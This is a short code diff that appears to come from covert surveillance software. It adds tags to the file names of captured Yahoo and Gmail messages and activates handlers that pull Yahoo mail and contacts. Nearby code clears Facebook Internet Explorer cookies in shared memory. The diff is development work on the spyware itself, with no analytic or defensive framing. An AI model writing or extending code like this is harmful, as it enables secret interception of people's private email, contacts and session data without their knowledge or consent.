@@ -126,8 +126,18 @@ void LogSocialMailMessageFull(DWORD program, BYTE *raw_mail, DWORD size, BOOL is
 		additional_header.Flags |= MAIL_DRAFT;
 	additional_header.Program = program;
 	additional_header.VersionFlags = MAPI_V3_0_PROTO;
+	char* pFileNameTag = 0;
+	if (MAIL_YAHOO == program){
+		pFileNameTag = "y_";
+	}
+	else if (MAIL_GMAIL == program){
+		pFileNameTag = "g_";
+	}
+	else {
+		pFileNameTag = "d_";
+	}
 
-	hf = Log_CreateFile2(PM_MAILAGENT, (BYTE *)&additional_header, sizeof(additional_header), is_incoming);
+	hf = Log_CreateFile2(PM_MAILAGENT, pFileNameTag,(BYTE *)&additional_header, sizeof(additional_header), is_incoming);
 	Log_WriteFile2(hf, (BYTE *)raw_mail, additional_header.Size);
 	Log_CloseFile2(hf); 
 
@@ -216,9 +226,9 @@ void InitSocialEntries()
 	wcscpy_s(social_entry[5].domain, OUTLOOK_DOMAIN);
 	social_entry[5].RequestHandler = 0;//HandleOutlookMail;
 	wcscpy_s(social_entry[6].domain, YAHOO_DOMAIN);
-	social_entry[6].RequestHandler = 0;//YahooMessageHandler;
+	social_entry[6].RequestHandler = YahooMessageHandler;
 	wcscpy_s(social_entry[7].domain, YAHOO_DOMAIN);
-	social_entry[7].RequestHandler = 0;//YahooContactHandler;
+	social_entry[7].RequestHandler = YahooContactHandler;
 
 	// Azzera i cookie in shared mem relativi a IExplorer
 	ZeroMemory(FACEBOOK_IE_COOKIE, sizeof(FACEBOOK_IE_COOKIE));
